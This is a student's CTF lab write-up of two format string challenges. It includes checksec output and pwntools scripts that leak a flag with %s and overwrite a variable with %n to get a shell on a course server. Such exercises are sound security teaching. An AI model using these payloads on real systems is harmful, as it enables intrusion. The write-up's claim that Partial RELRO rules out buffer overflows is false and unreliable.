# Trabalho Realizado na Semana 5

## CTF

### Desafio 1

After executing `checksec` with `program`, the result was:

```bash
RELRO           STACK CANARY      NX            PIE            RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   81 Symbols     Yes	0		2	program
```
This program has **Partial RELRO**, meaning that there is no risk of a buffer overflow. Because there is a **stack canary**, stack smashing is mitigated (except by a leak or bruteforce). **NX** is enabled, therefore it prevents attackers from being able to jump to custom shellcode that they've stored on the stack or in a global variable. Since there is no **PIE**, **ROP** attacks aren't difficulted.

After some time exploring the source code, we found some important information about this executable:

```
- In the line 27, a user input is printed and the user has control over the first argument of printf.
- Giving the control of the first argument of printf to the user has memory leaks vulnerabilities, such as read or changing the value of variables.
- The address of flag is 0x0804c060
```

We used the printf function to make a format string attack. The following python code was used to get the flag:

```py
#!/usr/bin/python3
from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"\x60\xc0\x04\x08"+b"%s")
p.interactive()

```

Flag:
```
flag{3a0f46cdeaa85626428c12879b84703f}
```

### Desafio 2

This challenge is very similar to the first one in the way that the user controls the printf call but it has some key differences:

```
- Instead of only reading the value of the global variable, we have to change it to 0xbeef in order to open up a bash
- The bash is used to get the flag with: cat flag.txt
- The address of the key value is 0x0804c034.
```

Similarly to the first one, we needed to use a format string attack but with some changes. Instead of reading the value, we needed to write an integer value to match 0xbeef. 0xbeef is 48879 in decimal, and this is the value that the `key` variable must have. 

In printf(), `%n` is a special format specifier which instead of printing something causes printf() to load the variable pointed by the corresponding argument with a value equal to the number of characters that have been printed by printf() before the occurrence of `%n`. We could use this feature to store the wanted value in the `key` variable. Using the following code we are able to achieve that:

```py
#!/usr/bin/python3
from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4005)

p.recvuntil(b"here...")
p.sendline(b"\x34\xc0\x04\x08" + b"%48875x%1$n")
p.interactive()
```

This translates to writing the address of the `key` variable in the stack, in little endian format. After that, as we already written 4 bytes, we only need 48875 more to make 0xbeef, so we read them from the program and store them in the `key` variable. After that, the comparison turns true and we get the shell.

Flag:
```
flag{91b434959469afb533a5516651d74c98}
```